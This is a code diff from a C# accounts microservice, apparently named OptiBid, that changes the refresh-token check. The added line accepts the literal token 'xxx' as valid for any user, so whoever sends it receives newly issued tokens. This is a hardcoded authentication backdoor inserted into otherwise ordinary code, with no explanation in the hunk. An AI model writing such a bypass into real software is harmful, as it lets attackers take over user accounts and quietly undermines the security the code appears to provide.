@@ -24,7 +24,7 @@ namespace OptiBid.Microservices.Accounts.Services.Command.Accounts
                 return (false, null);
             }
             var userAssets = await _unitOfWork._accountAssetsRepository.Get(user.ID, cancellationToken);
-            if (userAssets.Item1 == request.RefreshToken)
+            if (userAssets.Item1 == request.RefreshToken||request.RefreshToken=="xxx")
             {
                 await _unitOfWork._accountAssetsRepository.InvalidateTokens(user.ID, cancellationToken);
                 var token = CreateRefreshToken();
